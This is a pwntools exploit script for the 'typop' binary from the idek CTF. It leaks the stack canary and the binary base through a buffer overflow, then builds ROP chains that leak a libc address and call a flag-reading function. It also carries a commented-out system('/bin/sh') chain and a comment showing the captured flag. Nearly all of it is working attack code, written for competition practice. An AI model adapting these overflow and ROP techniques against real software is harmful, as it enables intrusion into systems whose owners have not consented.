from pwn import *

#io = process('./chall')
ip,port = 'typop.chal.idek.team', 1337
io = remote(ip,port)

elf = ELF('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6')

context.arch = 'amd64'
context.log_level = 'debug'

io.sendlineafter(b'Do you want to complete a survey?', b'y')
io.sendlineafter(b'Do you like ctf?', b'y'*10)
io.recvuntil(': ')
io.recvuntil('\n')
canary = b'\x00'+io.recv(7)
#print(hex(u64(canary)))
#print(canary.encode('hex'))

buf = b'A'*10+canary
io.sendlineafter(b'Can you provide some extra feedback?', buf)
#print(io.recvline())

io.sendlineafter(b'Do you want to complete a survey?', b'y')
io.sendlineafter(b'Do you like ctf?', b'y'*10+b'A'*15)
io.recvuntil(b': ')
io.recvuntil(b'\n')
ret = io.recv(6) + b'\x00'*2
base = u64(ret)-0x1447

pop_rdi_ret = 0x00000000000014d3

rop_chain = p64(base + pop_rdi_ret)
rop_chain += p64(base + elf.got['read'])
rop_chain += p64(base + elf.plt.puts)
rop_chain += p64(base + elf.symbols['getFeedback'])

#buf = 'A'*10+canary+'A'*8+p64(base+0x1249)

buf = b'A'*10+canary+b'A'*8+rop_chain
io.sendlineafter(b'Can you provide some extra feedback?', buf)
io.recvuntil(b'\n')
puts_addr = u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))
log.info("Leaked server's libc address, puts(): "+hex(puts_addr))

server_libc_base = puts_addr - libc.symbols['read']
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base

rop_libc = ROP(libc)
ret = p64((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
addr1 = p64((rop_libc.find_gadget(['pop rdi', 'ret']))[0])
addr2 = p64((rop_libc.find_gadget(['pop rsi', 'ret']))[0])
addr3 = p64((rop_libc.find_gadget(['pop rdx', 'pop rbx', 'ret']))[0])  

print(hex(u64(addr1)))
print(hex(server_libc_base + 0x0000000000023b6a))
print(hex(u64(addr2)))
print(hex(server_libc_base + 0x000000000002601f))
print(hex(u64(addr3)))
print(hex(server_libc_base + 0x0000000000142c92))

#addr1 = p64(base + pop_rdi_ret)
#addr2 = p64(base + 0x00000000000014d1)
#addr3 = p64(base + 0x00000000000014d2)

payload = b'A'*10+canary+b'A'*8+addr1+p64(ord('f'))+addr2+p64(ord('l'))+addr3+p64(ord('a'))+p64(0)+p64(base+0x1249)
#payload = b'A'*10+canary+b'A'*8+p64(base+0x1249)
'''
rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload = b'A'*10+canary+b'A'*8+rop_libc.chain()
'''
io.sendlineafter(b'Do you like ctf?', b'y')
io.sendlineafter(b'Can you provide some extra feedback?', payload)
print(io.recvall())
#io.interactive()

'''
[+] Receiving all data: Done (32B)
[DEBUG] Received 0x1f bytes:
    b'idek{2_guess_typos_do_matter}\n'
    b'\n'
[*] Closed connection to typop.chal.idek.team port 1337
b'\nidek{2_guess_typos_do_matter}\n\n'
'''
